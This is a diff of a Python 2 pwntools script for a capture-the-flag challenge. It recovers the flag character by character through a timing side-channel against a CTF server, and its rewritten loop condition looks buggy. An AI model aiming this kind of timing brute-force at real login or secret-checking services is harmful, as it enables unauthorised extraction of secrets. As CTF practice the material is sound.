@@ -1,26 +1,32 @@
-#!/usr/bin/python2
+#!/usr/bin/env python2
 
-from pwn import *
+from pwn import remote
 import time
+import string
+
+charset = string.ascii_lowercase + string.ascii_uppercase + string.punctuation + string.digits
 
 flag = "HNF{"
-max_time  = 1
-
-while True:
-    for c in "!?}_15scktemng4afbsydh5ij37lopqruvwx02689z-@{":
-        r = remote("hnfremoteserver", port)
+while flag[:-1] != "}":
+    for c in charset:
+        r = remote("ctf.yadunut.com", 4000)
         r.recv()
 
+        # get 1st time
         before = time.time()
-        r.sendline(flag+c)
+        r.sendline(flag + c)
         r.recv()
+
+        # 2nd time for comparison
+        after = time.time()
+        difference = after-before
         r.close()
 
-        after = time.time()
-        if after-before > max_time:
-            max_time = max_time+1
-            print max_time
-            flag = flag+c
+        if difference > 5:
+            flag+=c
+            print "CHAR FOUND!!"
+            print "Current Flag: {}".format(flag)
             break
+        
 
-    print flag
+print "FOUND FLAG!!\nFlag: {}".format(flag)
